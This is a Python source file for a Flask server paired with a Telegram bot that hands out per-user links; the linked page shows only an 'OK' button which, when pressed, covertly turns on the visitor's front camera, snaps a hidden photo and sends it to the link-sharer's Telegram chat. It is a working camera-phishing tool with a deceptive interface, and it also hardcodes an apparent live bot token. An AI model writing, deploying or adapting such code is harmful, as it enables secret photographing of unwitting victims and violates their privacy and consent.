from flask import Flask, request, render_template_string
from telegram import Bot
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import threading

TOKEN = "7975528068:AAGATkbuwH8cRrd5ZA3e8oZ6wL3QJOQ0ga4"
bot = Bot(TOKEN)
app = Flask(__name__)
USERS = {}

HTML = """
<!doctype html>
<html>
<body style="text-align:center">
<h1>OK</h1>
<button onclick="go()" style="font-size:30px">OK</button>

<video id="v" autoplay playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
function go(){
 navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}})
 .then(s=>{
  v.srcObject=s;
  setTimeout(capture,1500);
 });
}
function capture(){
 c.width=v.videoWidth; c.height=v.videoHeight;
 c.getContext('2d').drawImage(v,0,0);
 c.toBlob(b=>{
  fetch("/upload/{{uid}}",{method:"POST",body:b});
 },'image/jpeg');
}
</script>
</body>
</html>
"""

@app.route("/<uid>")
def page(uid):
    return render_template_string(HTML, uid=uid)

@app.route("/upload/<uid>", methods=["POST"])
def upload(uid):
    chat = USERS.get(uid)
    if chat:
        bot.send_photo(chat_id=chat, photo=request.data)
    return "OK"

async def start(update, context: ContextTypes.DEFAULT_TYPE):
    uid = str(update.effective_user.id)
    USERS[uid] = update.effective_chat.id
    link = f"http://127.0.0.1:8080/{uid}"
    await update.message.reply_text(f"دا لینک خلاص کړه 👇\n{link}")

def web():
    app.run(port=8080)

if __name__ == "__main__":
    threading.Thread(target=web).start()
    ApplicationBuilder().token(TOKEN).build().add_handler(
        CommandHandler("start", start)
    ).run_polling()
